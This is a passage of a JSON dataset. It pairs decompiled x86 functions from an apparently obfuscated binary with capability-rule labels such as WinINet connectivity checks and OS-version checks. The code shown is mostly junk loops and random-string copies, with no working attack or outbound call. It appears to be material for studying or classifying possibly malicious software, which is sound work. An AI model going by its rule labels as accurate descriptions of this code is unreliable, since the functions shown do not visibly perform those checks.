        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00411eec(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint in_ECX;\n    uint var_78h;\n    uint var_74h;\n    uint var_6ch;\n    uint var_64h;\n    uint var_4ah;\n    uchar var_3ah;\n    uint var_39h;\n    uint var_29h;\n    ulong uStack36;\n    int32_t var_11h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_11h._0_1_ = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"aljvyptlle\", &var_4ah);\n    fcn.00483140();\n    uStack36 = *0x522440;\n    stack0xffffffd4 = *0x522448;\n    var_29h._0_1_ = 0;\n    stack0xffffffc4 = *0x522450;\n    var_39h._0_1_ = 1;\n    var_3ah = 1;\n    stack0xffffffb4 = *0x522458;\n    for (var_ch = 0x51; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (stack0xffffffec = 0x4a; 0 < stack0xffffffec; unique0x00007a80 = stack0xffffffec + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"znfjlkzia\", &var_4ah + 1);\n    fcn.00483140();\n    fcn.004b2800();\n    return in_ECX;\n}\n",
        "token_count": 413
    },
    "0041200c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nfloat10 __cdecl\nfcn.0041200c(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint noname_6, \n            uint arg_24h, uint arg_28h, uint arg_2ch)\n\n{\n    double dVar1;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_2dh;\n    uchar var_25h;\n    uint var_24h;\n    ulong uStack36;\n    ulong uStack28;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    uStack28 = *0x522460;\n    uStack36 = *0x522468;\n    fcn.00483110();\n    fcn.004b21e0(\"dwdzlytplvygxgah\", &var_2dh);\n    fcn.00483140();\n    dVar1 = *0x522470;\n    var_24h = 0x11dd;\n    var_25h = 1;\n    stack0xffffffd0 = 0x261;\n    for (var_ch = 0x26; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 361
    },
    "004120e6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004120e6(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_84h;\n    uint var_6ch;\n    uint var_54h;\n    uint var_3bh;\n    uint var_29h;\n    uchar var_1dh;\n    uint var_1ch;\n    int32_t var_15h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_15h._0_1_ = 1;\n    var_1ch = 0x5e3;\n    var_1dh = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"wfjckttnmltkslificwiryvnjamunrlj\", &var_3bh);\n    fcn.00483140();\n    stack0xffffffd4 = *0x522478;\n    fcn.00483110();\n    fcn.004b21e0(\"cdsrrqtumuvxezitzaymamzepuithmorzlwxgtcyvjdmukjiiuetqwywzgawvq\", &var_3bh + 1);\n    fcn.00483140();\n    var_29h._0_1_ = 0;\n    stack0xffffffc4 = *0x522480;\n    fcn.00483110();\n    fcn.004b21e0(\"lhennquvtfmalblyadltjzrbqqazsfwkgkdt\", &var_3bh + 2);\n    fcn.00483140();\n    for (var_ch = 0x17; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 6; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    for (stack0xffffffe8 = 0x53; 0 < stack0xffffffe8; unique0x00007a80 = stack0xffffffe8 + -1) {\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return 0x16230;\n}\n",
        "token_count": 561
    },
    "0041238e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __cdecl fcn.0041238e(uint arg_8h)\n\n{\n    char cVar1;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_b0h;\n    uint var_98h;\n    uint var_80h;\n    uint var_68h;\n    uchar var_64h [27];\n    uint var_49h;\n    uchar var_2eh;\n    uchar var_2dh;\n    uint var_2ch;\n    ulong uStack44;\n    ulong uStack36;\n    ulong uStack28;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"tsxazqropwmilnayopeptopkddhjcbhfwagzmgpsjnabhuxwpfaikggwpidstpwbb\", &var_68h);\n    fcn.00483140();\n    uStack28 = *0x522488;\n    fcn.00483110();\n    fcn.004b21e0(\"cted\", &var_68h + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"qekdijcjnlnoekegkkxudygshbyopvxnlchdpojwmzzaoygxtlifsirjfcpzxokkirrdookierectwcnx\", &var_68h + 2);\n    fcn.00483140();\n    uStack36 = *0x522490;\n    uStack44 = *0x522498;\n    fcn.00483110();\n    fcn.004b21e0(\"rvwwitwzgyvdnidagzzqflprychnrmrzxnuih\", &var_68h + 3);\n    fcn.00483140();\n    var_2ch = 0x560;\n    var_2dh = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"cted\", &var_49h);\n    fcn.00483110();\n    fcn.004b21e0(\"cted\", &var_2eh);\n    cVar1 = fcn.004c1070(&var_49h + 1, var_64h);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x4e; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 650
    },
    "004126cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl\nfcn.004126cc(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint noname_7, uint arg_28h)\n\n{\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_1eh;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_14h = 0x811;\n    fcn.00483110();\n    fcn.004b21e0(\"ptgfzjgfvzicfstnzuhtkjtnniixrkwflathodkgssvlhmaginilstqdcyhxi\", &var_1eh);\n    fcn.00483140();\n    var_18h = 399;\n    stack0xffffffe0 = 0xfe7;\n    var_1eh._1_1_ = 0;\n    for (var_ch = 0x55; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0x2b; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.004b2800();\n    return 0x8d86;\n}\n",
        "token_count": 395
    },
    "004127aa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.004127aa(uint arg_8h, uint arg_ch, uint noname_2, uint noname_3, uint arg_18h, uint noname_5, uint arg_20h, \n            uint arg_24h)\n\n{\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_41h;\n    uint var_31h;\n    uint var_21h;\n    uint var_14h;\n    int32_t var_dh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    for (var_4h = 0x57; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    for (var_8h = 0x20; 0 < var_8h; var_8h = var_8h + -1) {\n    }\n    for (stack0xfffffff0 = 9; 0 < stack0xfffffff0; unique0x00007a80 = stack0xfffffff0 + -1) {\n    }\n    return 0;\n}\n",
        "token_count": 277
    },
    "004134f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004134f0(uint noname_0, uint arg_ch, uint arg_10h, uint noname_3, uint noname_4, uint arg_1ch)\n\n{\n    char cVar1;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_9ch;\n    uint var_84h;\n    uint var_6ah;\n    uint var_4dh;\n    uint var_31h;\n    ulong uStack44;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_dh;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"svfclchvrisjpfxluxljduufcaejxhqxjjtswuhvgetppuyjjwwpiuvbecilqbpsdvpqxugkbvsoiddxoinlq\", &var_6ah);\n    fcn.00483140();\n    var_dh._0_1_ = 1;\n    var_14h = 0x526;\n    var_18h = 0x61d;\n    var_1ch = 0x19c6;\n    uStack44 = *0x522580;\n    stack0xffffffcc = *0x522588;\n    fcn.00483110();\n    fcn.004b21e0(\"yzypfpyxmxxiaqyhslwsxaqoyzcmqnigqaacxyfblffhandenjgvagikpzcggjtaqolhspmokibrcagdtlsysyrhj\", \n                 &var_6ah + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"yzypfpyxmxxiaqyhslwsxaqoyzcmqnigqaacxyfblffhandenjgvagikpzcggjtaqolhspmokibrcagdtlsysyrhj\", &var_4dh);\n    fcn.00483110();\n    fcn.004b21e0(\"yzypfpyxmxxiaqyhslwsxaqoyzcmqnigqaacxyfblffhandenjgvagikpzcggjtaqolhspmokibrcagdtlsysyrhj\", &var_31h);\n    cVar1 = fcn.004c1070(&var_4dh + 1, &var_6ah + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xfffffff0 = 0x1d; 0 < stack0xfffffff0; unique0x00007a80 = stack0xfffffff0 + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return 1;\n}\n",
        "token_count": 714
    },
    "004138e2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl\nfcn.004138e2(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint arg_20h, \n            uint noname_7, uint arg_28h, uint arg_2ch)\n\n{\n    char cVar1;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_6ch;\n    uint var_60h;\n    uint var_45h;\n    uint var_29h;\n    int32_t var_dh;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"nomdsvkbmqtoruudipcilfwrtfrznidwzhleroawdzekrcohfyysueyxlfkqftbapsbsipsnvcyybxninllxicip\", &var_45h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"nomdsvkbmqtoruudipcilfwrtfrznidwzhleroawdzekrcohfyysueyxlfkqftbapsbsipsnvcyybxninllxicip\", &var_29h);\n    fcn.00483110();\n    fcn.004b21e0(\"nomdsvkbmqtoruudipcilfwrtfrznidwzhleroawdzekrcohfyysueyxlfkqftbapsbsipsnvcyybxninllxicip\", &var_dh);\n    cVar1 = fcn.004c09a0(&var_29h + 1, &var_45h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xfffffff0 = 0x27; 0 < stack0xfffffff0; unique0x00007a80 = stack0xfffffff0 + -1) {\n        }\n    }\n    fcn.004b2800();\n    return 0x997e;\n}\n",
        "token_count": 543
    },
    "00413a60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00413a60(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e4h;\n    uint var_cch;\n    uint var_b4h;\n    uint var_9bh;\n    uint var_7dh;\n    uint var_61h;\n    uint var_45h;\n    uchar var_2bh;\n    uchar var_2ah;\n    uint var_29h;\n    uint var_1ch;\n    uint var_18h;\n    uchar var_12h;\n    int32_t var_11h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_11h._0_1_ = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"kgedodgnjo\", &var_9bh);\n    fcn.00483140();\n    var_12h = 0;\n    var_18h = 0x1264;\n    var_1ch = 0x268;\n    stack0xffffffd4 = *0x5225a0;\n    fcn.00483110();\n    fcn.004b21e0(\"ipkkuslurlzraxfcblbbbysankjkbrshmpaxxojzwcepfuherkbtnlbxiojlkkuzjspfoomwrietulcrchlxjswqqyt\", \n                 &var_9bh + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(0x519e1c, &var_9bh + 2);\n    fcn.00483140();\n    var_29h._0_1_ = 0;\n    var_2ah = 0;\n    fcn.00483110();\n    fcn.004b21e0(0x519e1c, &var_7dh);\n    fcn.00483110();\n    fcn.004b21e0(0x519e1c, &var_61h);\n    cVar1 = fcn.004c1070(&var_7dh + 1, &var_9bh + 3);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x58; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"kgedodgnjo\", &var_45h);\n    fcn.00483110();\n    fcn.004b21e0(\"kgedodgnjo\", &var_2bh);\n    cVar1 = fcn.004c1070(&var_45h + 1, &var_61h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xffffffec = 0x4b; 0 < stack0xffffffec; unique0x00007a80 = stack0xffffffec + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 827
    },
    "00413dd6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00413dd6(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_8ch;\n    uint var_84h;\n    uint var_69h;\n    uint var_4dh;\n    uchar var_32h;\n    uint var_31h;\n    uint var_24h;\n    ulong uStack36;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_14h = 0x5a7;\n    uStack36 = *0x5225b0;\n    fcn.00483110();\n    fcn.004b21e0(\"yxebvfkshvihuuukfamhowyajysdpzxc\", &var_69h);\n    fcn.00483140();\n    var_24h = 0x9eb;\n    stack0xffffffcc = *0x5225b8;\n    var_31h._0_1_ = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"yxebvfkshvihuuukfamhowyajysdpzxc\", &var_4dh);\n    fcn.00483110();\n    fcn.004b21e0(\"yxebvfkshvihuuukfamhowyajysdpzxc\", &var_32h);\n    cVar1 = fcn.004c09a0(&var_4dh + 1, &var_69h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x19; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    for (var_10h = 0x39; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.004b2800();\n    return 0;\n}\n",
        "token_count": 550
    },
    "00413f80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl fcn.00413f80(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint arg_18h, uint arg_1ch)\n\n{\n    uint in_ECX;\n    uint var_68h;\n    uint var_64h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_40h;\n    uint var_28h;\n    uint var_24h;\n    ulong uStack36;\n    ulong uStack28;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"fbnuwegiptmeneilzvtpgwywsmxyzqytpbhakxsatykodnt\", &var_28h);\n    fcn.00483140();\n    var_10h = 0xbac;\n    uStack28 = *0x5225c0;\n    uStack36 = *0x5225c8;\n    fcn.00483110();\n    fcn.004b21e0(\"wggaegezukrxrsfxyicyurktaevjomelvbulupcwdhsrhffuvyihdtwaxvujmhsaxpvttmiisouddlfw\", &var_28h + 1);\n    fcn.00483140();\n    var_24h = 0x71;\n    var_28h._3_1_ = 1;\n    for (var_ch = 0x51; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(0x519e1c, &var_28h + 2);\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.004b2800();\n    return in_ECX;\n}\n",
        "token_count": 449
    },
    "004140ca": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004140ca(void)\n\n{\n    char cVar1;\n    uint var_cch;\n    uint var_c8h;\n    uint var_b0h;\n    uint var_98h;\n    uint var_80h;\n    uint var_68h;\n    uchar var_64h [27];\n    uint var_49h;\n    uchar var_2eh;\n    uchar var_2dh;\n    uint var_2ch;\n    ulong uStack44;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_11h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_11h._0_1_ = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"cpyvqqbrndtujyoabyxgwjknhfswbz\", &var_68h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"rmjncwwdqyjfqbueppkrgygsthktdtnfzqckvocycsqzdjphykdxopzbaogfzziavlvmeubqfqtbvsrzpxjuqjqzssjmoq\", \n                 &var_68h + 1);\n    fcn.00483140();\n    var_18h = 0x7a3;\n    fcn.00483110();\n    fcn.004b21e0(\"kjfolfltqhykmnrbaixmnoqfz\", &var_68h + 2);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"qipvtpwfcujbdjaskkkillsmjahcilqpnjzabgkqcytghgneavjrggboxhnjstvm\", &var_68h + 3);\n    fcn.00483140();\n    var_1ch = 0x1568;\n    uStack44 = *0x5225d0;\n    var_2ch = 0x105f;\n    var_2dh = 1;\n    for (var_ch = 0x5a; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"rmjncwwdqyjfqbueppkrgygsthktdtnfzqckvocycsqzdjphykdxopzbaogfzziavlvmeubqfqtbvsrzpxjuqjqzssjmoq\", \n                 &var_49h);\n    fcn.00483110();\n    fcn.004b21e0(\"rmjncwwdqyjfqbueppkrgygsthktdtnfzqckvocycsqzdjphykdxopzbaogfzziavlvmeubqfqtbvsrzpxjuqjqzssjmoq\", \n                 &var_2eh);\n    cVar1 = fcn.004c09a0(&var_49h + 1, var_64h);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xffffffec = 0x45; 0 < stack0xffffffec; unique0x00007a80 = stack0xffffffec + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return 0;\n}\n",
        "token_count": 853
    },
    "0041438a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041438a(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint in_ECX;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uchar var_10h;\n    uchar var_fh;\n    uchar var_eh;\n    int32_t var_dh;\n    uint var_bp_4h;\n    \n    var_dh._0_1_ = 0;\n    var_eh = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"dwppblvwpveihrtprmnxzhczuagrnbzxkenjuixorigbuiebnwlhsabmtdpcmrwllihtltfkqsxfvprnm\", &var_10h);\n    fcn.00483140();\n    for (stack0xfffffff0 = 0x4a; 0 < stack0xfffffff0; unique0x00007a80 = stack0xfffffff0 + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"gppmokqtbxbwqya\", &var_fh);\n    fcn.00483140();\n    fcn.004b2800();\n    return in_ECX;\n}\n",
        "token_count": 345
    },
    "00414472": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __cdecl fcn.00414472(uint arg_8h, uint noname_1, uint noname_2, uint arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_a0h;\n    uint var_86h;\n    uint var_69h;\n    uint var_4dh;\n    uint var_31h;\n    uchar var_16h;\n    uchar var_15h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"xbthqwvhmbcddybsaldlktogdkoxlylsbevsdbtj\", &var_86h);\n    fcn.00483140();\n    var_14h = 0x4b3;\n    var_15h = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"wdtwyyivwtkskacdzuvdy\", &var_86h + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"wdtwyyivwtkskacdzuvdy\", &var_69h);\n    fcn.00483110();\n    fcn.004b21e0(\"wdtwyyivwtkskacdzuvdy\", &var_4dh);\n    cVar1 = fcn.004c1070(&var_69h + 1, &var_86h + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x4a; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"wdtwyyivwtkskacdzuvdy\", &var_31h);\n    fcn.00483110();\n    fcn.004b21e0(\"wdtwyyivwtkskacdzuvdy\", &var_16h);\n    cVar1 = fcn.004c1070(&var_31h + 1, &var_4dh + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 0; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 687
    },
    "004149e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004149e4(void)\n\n{\n    char cVar1;\n    uint var_10ch;\n    uint var_fch;\n    uint var_e4h;\n    uint var_cch;\n    uint var_b4h;\n    uint var_9ch;\n    uchar var_98h [27];\n    uint var_7dh;\n    uint var_61h;\n    uint var_45h;\n    uchar var_29h;\n    uint var_28h;\n    uchar var_21h;\n    uint var_20h;\n    uint var_1ch;\n    uchar var_16h;\n    int32_t var_15h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"wbsydrivjcacuyftpnnrhhrrthwjbuccjipxcdwsqxgxbhydpmcgy\", &var_9ch);\n    fcn.00483140();\n    var_15h._0_1_ = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"ibdnlltguuqdqrfmozhurfhkpfnzturkhfinkjfiiihsygvfxjcxpwxsgahgywlpdnb\", &var_9ch + 1);\n    fcn.00483140();\n    var_16h = 0;\n    var_1ch = 0xcb;\n    fcn.00483110();\n    fcn.004b21e0(\"qtbncmqxncshaqosdoqiufumvupgdzcjyppdlmwjsmmmp\", &var_9ch + 2);\n    fcn.00483140();\n    var_20h = 0x14b9;\n    var_21h = 1;\n    var_28h = 0x926;\n    fcn.00483110();\n    fcn.004b21e0(\"twbtzmqaqhqfqgswdjjetjzlubplqkmvhmjeoowukzmn\", &var_9ch + 3);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"twbtzmqaqhqfqgswdjjetjzlubplqkmvhmjeoowukzmn\", &var_7dh);\n    fcn.00483110();\n    fcn.004b21e0(\"twbtzmqaqhqfqgswdjjetjzlubplqkmvhmjeoowukzmn\", &var_61h);\n    cVar1 = fcn.004c1070(&var_7dh + 1, var_98h);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x47; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    for (var_10h = 0x42; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"wbsydrivjcacuyftpnnrhhrrthwjbuccjipxcdwsqxgxbhydpmcgy\", &var_45h);\n    fcn.00483110();\n    fcn.004b21e0(\"wbsydrivjcacuyftpnnrhhrrthwjbuccjipxcdwsqxgxbhydpmcgy\", &var_29h);\n    cVar1 = fcn.004c09a0(&var_45h + 1, &var_61h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xffffffe8 = 100; 0 < stack0xffffffe8; unique0x00007a80 = stack0xffffffe8 + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return 1;\n}\n",
        "token_count": 1022
    },
    "00414d7c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
